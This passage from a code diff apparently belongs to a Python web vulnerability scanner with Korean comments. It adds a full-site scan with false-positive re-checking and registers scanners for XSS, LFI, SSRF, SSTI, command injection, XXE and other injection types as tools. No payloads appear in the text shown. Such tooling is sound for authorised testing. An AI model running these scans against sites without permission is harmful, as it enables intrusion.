+            print(f"  Playwright 추가 타겟: {len(pw_result.get('targets', []))}개")
+
+    print(f"\n  📋 총 {sum(len(t.get('params',[])) for t in all_targets[:10])}개 파라미터 ({len(all_targets)}개 URL)")
+
+    # 2단계: 스캔 작업 구성 (full_site_scan 재사용)
+    scan_result = full_site_scan(
+        url=url,
+        session_headers=session_headers,
+        max_params=max_params,
+        vuln_types=vulns,
+        parallel=True,
+    )
+
+    raw_findings = scan_result.get("findings", [])
+    print(f"\n  🔍 원본 발견: {len(raw_findings)}개")
+
+    # 3단계: FP 재검증
+    final_findings = raw_findings
+    if auto_fp_verify and raw_findings:
+        print(f"  🔬 FP 재검증 시작 ({min(len(raw_findings), 10)}개)...")
+        fp_result = batch_fp_verify(raw_findings, max_verify=10)
+        final_findings = fp_result.get("confirmed_findings", raw_findings)
+        removed = fp_result.get("removed_fps", [])
+        print(f"  FP 제거 후: {len(final_findings)}개 (제거: {len(removed)}개)")
+    else:
+        fp_result = {"confirmed_findings": raw_findings, "removed_fps": []}
+
+    by_type: Dict[str, int] = {}
+    for f in final_findings:
+        vt = f.get("vuln_type", "Unknown")
+        by_type[vt] = by_type.get(vt, 0) + 1
+
+    output_lines = [
+        f"\n{'═'*60}",
+        f"  🎯 FULL SITE SCAN v2 COMPLETE — {url}",
+        f"{'═'*60}",
+        f"  파라미터 발견: {sum(len(t.get('params',[])) for t in all_targets[:10])}개",
+        f"  원본 취약점: {len(raw_findings)}개",
+        f"  FP 제거 후: {len(final_findings)}개",
+        "",
+    ]
+    if by_type:
+        for vtype, cnt in sorted(by_type.items()):
+            output_lines.append(f"  ⚠️  [{vtype}] {cnt}개")
+    else:
+        output_lines.append("  ✅ 주요 취약점 미탐지")
+    output_lines.append(f"{'═'*60}")
+
+    print("\n".join(output_lines))
+
+    return {
+        "success": True,
+        "vuln_count": len(final_findings),
+        "by_type": by_type,
+        "confirmed_findings": final_findings,
+        "raw_findings": raw_findings,
+        "removed_fps": fp_result.get("removed_fps", []),
+        "output": "\n".join(output_lines),
+    }
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── TOOL REGISTRY 등록 ───────────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
 VULN_SCANNER_PLUS_TOOLS = {
-    "xss_scan_plus":          xss_scan_plus,
-    "lfi_scan_plus":          lfi_scan_plus,
-    "ssrf_scan_plus":         ssrf_scan_plus,
-    "ssti_scan_plus":         ssti_scan_plus,
-    "cmdi_scan_plus":         cmdi_scan_plus,
-    "xxe_scan_plus":          xxe_scan_plus,
-    "nosql_scan_plus":        nosql_scan_plus,
-    "crlf_scan_plus":         crlf_scan_plus,
+    # v6.2.139
+    "xss_scan_plus":           xss_scan_plus,
+    "lfi_scan_plus":           lfi_scan_plus,
+    "ssrf_scan_plus":          ssrf_scan_plus,
+    "ssti_scan_plus":          ssti_scan_plus,
+    "cmdi_scan_plus":          cmdi_scan_plus,
+    "xxe_scan_plus":           xxe_scan_plus,
+    "nosql_scan_plus":         nosql_scan_plus,
+    "crlf_scan_plus":          crlf_scan_plus,
     "open_redirect_scan_plus": open_redirect_scan_plus,
-    "header_injection_scan":  header_injection_scan,
-    "full_site_scan":         full_site_scan,
-    "parallel_multi_scan":    parallel_multi_scan,
-    "auto_crawl_params":      auto_crawl_params,
+    "header_injection_scan":   header_injection_scan,
+    "full_site_scan":          full_site_scan,
+    "parallel_multi_scan":     parallel_multi_scan,
+    "auto_crawl_params":       auto_crawl_params,
+    # v6.2.140
+    "js_render_crawl":         js_render_crawl,
+    "auth_session_scan":       auth_session_scan,
+    "fp_verify":               fp_verify,
+    "batch_fp_verify":         batch_fp_verify,
+    "full_site_scan_v2":       full_site_scan_v2,
 }
